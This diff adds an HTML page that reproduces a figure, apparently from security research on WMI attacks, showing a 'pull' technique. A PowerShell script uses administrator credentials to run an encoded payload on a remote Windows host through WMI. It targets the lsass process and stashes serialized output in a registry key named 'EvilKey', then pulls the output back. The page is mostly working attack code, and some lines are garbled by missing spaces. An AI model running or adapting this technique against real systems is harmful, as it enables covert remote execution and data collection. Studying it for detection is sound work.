@@ -1,0 +1,42 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Pull Attack</title>
+</head><body>“Pull” Attack Registry<br/>
+Figure 10 demonstrates using the registry to pull back the results of a PowerShell command. Additionally, many malicious tools that attempt to capture the output of PowerShell commands simply convert the output to text. This example utilizes a PowerShell object serialization and deserialization method to maintain the rich type information present in PowerShell objects. &nbsp; <br/>
+<br/>
+$Credential=Get-Credential’WIN-B85AAA7ST4U\Administrator’<br/>
+$CommonArgs= @{<br/>
+&nbsp;Credential =$Credential<br/>
+&nbsp;ComputerName =’192.168.72.131’<br/>
+}<br/>
+<br/>
+# Create a remote registry key and value<br/>
+$HKLM=2147483650<br/>
+Invoke-WmiMethod@CommonArgs-ClassStdRegProv-NameCreateKeyArgumentList$HKLM,’SOFTWARE\EvilKey’<br/>
+Invoke-WmiMethod@CommonArgs-ClassStdRegProv-NameDeleteValueArgumentList$HKLM,’SOFTWARE\EvilKey’,’Result’<br/>
+<br/>
+# PowerShell payload that saves the serialized output of `Get-Process lsass` to the registry<br/>
+$PayloadText=@’<br/>
+$Payload = {Get-Process lsass}<br/>
+$Result = &amp; $Payload<br/>
+$Output = [Management.Automation.PSSerializer]::Serialize($Result, 5)<br/>
+$Encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.<br/>
+GetBytes($Output))<br/>
+Set-ItemProperty -Path HKLM:\SOFTWARE\EvilKey -Name Result -Value<br/>
+$Encoded<br/>
+‘@<br/>
+<br/>
+$EncodedPayload=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadText))<br/>
+$PowerShellPayload=”powershell -NoProfile -EncodedCommand $EncodedPayload”<br/>
+<br/>
+# Invoke PowerShell payload<br/>
+Invoke-WmiMethod@CommonArgs-ClassWin32_Process-NameCreateArgumentList$PowerShellPayload<br/>
+<br/>
+# Pull the serialized results back<br/>
+$RemoteOutput=Invoke-WmiMethod@CommonArgs-ClassStdRegProvNameGetStringValue-ArgumentList$HKLM,’SOFTWARE\EvilKey’,’Result’<br/>
+$EncodedOutput=$RemoteOutput.sValue<br/>
+<br/>
+# Deserialize and display the result of the command executed on the remote system<br/>
+$DeserializedOutput=[Management.Automation.PSSerializer]::Deserialize([Text.Encoding]::Ascii.GetString([Convert]::FromBase64String($EncodedOutput))) </body></html>
